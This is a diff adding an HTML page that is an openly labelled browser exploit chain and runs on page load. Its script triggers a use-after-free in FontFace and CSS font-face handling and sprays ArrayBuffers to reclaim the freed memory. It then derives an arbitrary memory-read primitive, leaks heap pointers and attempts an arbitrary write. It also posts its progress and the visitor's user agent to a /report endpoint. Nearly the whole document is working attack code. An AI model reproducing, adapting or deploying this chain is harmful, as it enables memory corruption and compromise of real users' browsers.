@@ -1,0 +1,63 @@
+<!doctype html><html><body style="margin:0;padding:10px;font-family:system-ui;background:#07090d;color:#cfe3ff">
+<button id="go" style="font-size:20px;padding:10px 22px;border-radius:10px">CHAIN</button>
+<pre id="o" style="font:12px/1.4 ui-monospace;white-space:pre-wrap;margin-top:8px"></pre>
+<script>
+var L=[],o=document.getElementById("o");
+function lg(s){o.textContent+=s+"\n";L.push(s);try{fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:L})}).catch(function(){})}catch(e){}}
+function hx(a,b){return "0x"+("00000000"+(b>>>0).toString(16)).slice(-8)+("00000000"+(a>>>0).toString(16)).slice(-8)}
+var S=0xb8,F=0x28,FZ=0x30,FC=0x34,ST=0x7a;
+async function uaf(){
+ var n=0xb0,ab=[],ft=null,fa=null,st=document.createElement("style");
+ var r1="@font-face{font-family:s;src:local(systemfont);unicode-range:U+0043}";
+ var r2="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042}";
+ var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+ document.fonts.add(A);void A.loaded;document.head.append(st);
+ for(var i=0;i<n/4;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ var u=st.sheet.cssRules.length;st.sheet.insertRule(r2,st.sheet.cssRules.length);
+ for(var i=n/4;i<n;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ void document.body.offsetHeight;
+ var ot=FontFace.prototype.then;
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+  if(this!==A)return;lg("[1] UAF");
+  st.sheet.deleteRule(u);void document.body.offsetHeight;
+  for(var i=st.sheet.cssRules.length-1;i>=0;i--){if(st.sheet.cssRules[i].cssText.indexOf("s;")>=0||st.sheet.cssRules[i].cssText.indexOf("spray")>=0)st.sheet.deleteRule(i)}
+  void document.body.offsetHeight;
+  for(var i=0;i<n;i++){var b=new ArrayBuffer(S),d=new DataView(b);d.setUint32(0x58,0,true);d.setUint32(0x5c,0,true);d.setUint32(8,1,true);d.setUint8(ST,3);ab.push(b)}
+  return undefined}});
+ var fs=null;try{fs=await document.fonts.load("1em a,b","AB")}catch(e){}
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
+ if(!fs||fs.length!==2)return null;
+ for(var i=0;i<fs.length;i++)if(fs[i].unicodeRange==="U+0-10FFFF")ft=fs[i];
+ for(var i=0;i<ab.length;i++)if(new DataView(ab[i]).getUint32(8,true)===2)fa=ab[i];
+ if(!ft||!fa)return null;
+ var d=new DataView(fa);
+ function sp(o2,a,b){d.setUint32(o2,a>>>0,true);d.setUint32(o2+4,b>>>0,true)}
+ function rd(a,b,sz){var r=new ArrayBuffer(sz),v=new Uint8Array(r),i=0;while(i<sz){sp(F,(a+i)>>>0,b);d.setInt32(FZ,1,true);d.setInt32(FC,1,true);var s=ft.featureSettings;for(var j=1;j<5&&i<sz;j++)v[i++]=s.charCodeAt(j)&255}return r}
+ return {f:ft,rd:rd,ab:fa,dv:d};
+}
+async function run(){
+ lg("CHAIN-FINAL "+navigator.userAgent);
+ var u=await uaf();if(!u){lg("no primitive");return}
+ var d=u.dv;
+ var ww=u.rd(d.getUint32(0x60,true),d.getUint32(0x64,true),0x80);
+ var wv=new DataView(ww.buffer||new Uint8Array(ww).buffer);
+ var W={lo:ww.length?d.getUint32(0x60,true):0,hi:d.getUint32(0x64,true)};
+ var Fp={lo:wv.getUint32(8,true),hi:wv.getUint32(12,true)};
+ var fw=u.rd(Fp.lo,Fp.hi,0x80); var fv=new DataView(fw.buffer||new Uint8Array(fw).buffer);
+ var Bp={lo:fv.getUint32(0x30,true),hi:fv.getUint32(0x34,true)};
+ lg("[leak] W="+hx(W.lo,W.hi)+" F="+hx(Fp.lo,Fp.hi)+" B="+hx(Bp.lo,Bp.hi));
+ // field walk on B (window reads)
+ var bw=u.rd(Bp.lo,Bp.hi,0x80); var bv=new DataView(bw.buffer||new Uint8Array(bw).buffer);
+ function q(off){return hx(bv.getUint32(off,true),bv.getUint32(off+4,true))}
+ lg("[B] +0x08="+q(8)+" +0x28="+q(0x28)+" +0x30="+q(0x30)+" +0x40="+q(0x40)+" +0x58="+q(0x58)+" +0x7A="+bv.getUint8(0x7A));
+ // ARW: free the scratch and reclaim (proven)
+ var tgt={lo:(Bp.lo+0x1000)>>>0,hi:Bp.hi};
+ d.setUint32(F,tgt.lo,true);d.setUint32(F+4,tgt.hi,true);d.setInt32(FZ,1,true);d.setInt32(FC,1,true);
+ try{u.f.featureSettings='"liga" 1';lg("[free] ok")}catch(e){lg("[free] threw: "+e.message)}
+ var tags=[];for(var i=0;i<0x40;i++){var ab=new ArrayBuffer(S);new DataView(ab).setUint32(0,0x11223344,true);tags.push(ab)}
+ var chk=new Uint8Array(u.rd(tgt.lo,tgt.hi,8));
+ lg("[write] "+Array.from(chk).map(function(x){return ("0"+x.toString(16)).slice(-2)}).join(" "));
+ lg("done");
+}
+document.getElementById("go").addEventListener("click",run);run();
+</script></body></html>
